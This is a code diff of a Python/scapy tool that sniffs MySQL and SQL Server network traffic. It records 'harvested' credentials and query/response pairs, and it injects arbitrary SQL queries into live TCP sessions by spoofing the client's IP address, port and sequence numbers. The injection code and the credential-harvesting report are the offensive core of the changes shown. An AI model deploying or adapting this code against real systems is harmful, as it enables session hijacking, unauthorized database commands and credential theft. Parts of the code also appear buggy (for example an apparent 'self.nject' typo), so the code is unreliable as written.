@@ -1,9 +1,10 @@
 from os import walk
 from operator import itemgetter
 from scapy.all import *
-import sys, getopt, re, argparse,threading
+import sys, getopt, re, argparse, threading, datetime
 sys.path.append("databases/")
 from constantvalues import *
+#import constantvalues
 import mysql,sqlserver,Queue
 
 dbQueue1 = Queue.Queue()
@@ -12,6 +13,7 @@ injectionQueue = Queue.Queue()
 pktQueue = Queue.Queue()
 
 settings = {}
+DATABASELIST = {'MYSQL':mysql.MySqlDB(), 'SQLSERV':sqlserver.SqlServerDB()}
 
 class Conn():
     def __init__(self,cip,cport,sip,sport,state,db,nextcseq=-1,nextsseq=-1):
@@ -20,12 +22,17 @@ class Conn():
         self.sip      = sip # server ip
         self.sport    = sport
         self.db       = db
-        self.traffic  = []
         self.frag     = []
         self.state    = state
         self.nextcseq = nextcseq
         self.nextsseq = nextsseq
         self.currentUser = ''
+        self.currentInstance = ''
+
+    def setInstance(self,inst):
+        self.currentInstance = inst
+        if inst not in self.db.instances:
+            self.db.instances[inst] = []
 
 class Database():
     def __init__(self,dbType,ip,port):
@@ -34,17 +41,7 @@ class Database():
         self.dbType      = dbType
         self.traffic     = []
         self.credentials = [] # username/hash pairs
-        self.instance    = {} # 'appnameDb' : [Table(), Table()]
-
-    def getHumanType(self):
-        return self.dbType
-        #dprint(self.dbType)
-        #if ISMYSQL(self.dbType):
-        #    return 'MySQL'
-        #elif ISSQLSERV(self.dbType):
-        #    return 'SQL Server'
-        #else:
-        #    return 'Unknown'
+        self.instances   = {} # 'appnameDb' : [Table(), Table()]
 
     def addUser(self,u):
         if u not in self.users:
@@ -53,11 +50,35 @@ class Database():
     def status(self):
         return None
 
+    def getTraffic(self,mode):
+        if mode == HUMAN:
+            resp = '%s%s@%s:%s%s\n\n'%('-'*20,self.dbType,self.ip,self.port,'-'*20)
+            resp += 'Credentials:\n'
+            if len(self.credentials)>0:
+                for u,p in self.credentials:
+                    resp += '\t%s : %s\n'%(u,p)
+            else:
+                resp += 'No credentials harvested\n'
+            resp += '\nTraffic:\n'
+            for t in self.traffic:
+                resp += '\n--Timestamp--\n%s\n'%t.timestamp
+                resp += '--Request--\n'
+                for q in t.query:
+                    resp += '%s\n'%q
+                resp += '--Response--\n'
+                for r in t.result:
+                    resp += '%s\n'%r
+            return resp
+
+    def addInstance(self,schema):
+        return
+
 class Traffic():
-    def __init__(self,query=None,result=None):
+    def __init__(self,query=None,result=None,instance=None):
         self.query = query
         self.result = result
         self.timestamp = datetime.datetime.now()
+        self.instance = instance
 
 #store table specific info such as columns and associated attributes
 class Table():
@@ -113,6 +134,8 @@ class Parse(threading.Thread):
                 self.toInject.append(injectionQueue.get())
             if not pktQueue.empty():
                 self.handle(pktQueue.get())
+        for db in self.knownDatabases:
+            print db.getTraffic(HUMAN)
 
     def getConn(self,pkt):
         for c in self.knownConns:
@@ -142,24 +165,22 @@ class Parse(threading.Thread):
         payload = ''
         for p in conn.frag:
             payload += str(p[TCP].payload)
+
+        if conn.frag[0][IP].src == conn.sip and conn.frag[0][TCP].sport == conn.sport: #is response
+            self.store(DATABASELIST[conn.db.dbType].parseResp(payload,conn),RESPONSE,conn)
+        else: #is request
+            self.store(DATABASELIST[conn.db.dbType].parseReq(payload,conn),REQUEST,conn)
+
         conn.frag = []
 
-        #if pkts[0][IP].src == conn.sip and pkts[0][TCP].sport == conn.sport: #is response
-        #    self.store(databaseList[conn.db.dbType].parseResp(payload,conn),conn.db.dbType*RESPONSE,conn)
-        #else: #is request
-        #    self.store(databaseList[conn.db.dbType].parseReq(payload,conn),conn.db.dbType*REQUEST,conn)
-
-    def validAscii(self,h):
-        if int(h,16)>31 and int(h,16)<127:
-            return True
-        return False
-
-    def readable(self,data):
-        a=""
-        for i in range(0,len(data),2):
-            if self.validAscii(data[i:i+2]):
-                a+=data[i:i+2].decode('hex')
-        return a
+    #TODO: revamp this to leverage error handling methods for adding traffc instead of appending to array
+    def store(self,data,pktType,conn):
+        if pktType==RESPONSE and len(conn.db.traffic) > 0 and conn.db.traffic[-1].result == None: #is result
+            conn.db.traffic[-1].result = data
+        elif pktType==RESPONSE: #is result, missed query
+            conn.db.traffic.append(Traffic(result=data))
+        else: #is query
+            conn.db.traffic.append(Traffic(query=data))
 
     def handle(self,pkt):
         #even with TCP filter set on scapy, will occassionally get packets
@@ -181,7 +202,7 @@ class Parse(threading.Thread):
                     self.printLn("[2] attempting injection")
                     #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                     #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
-                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]),iface=self.interface)
+                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/DATABASELIST[c.db.dbType].encodeQuery(i[0]),iface=self.interface)
                     self.nject.remove(i)
 
         #check for control packets
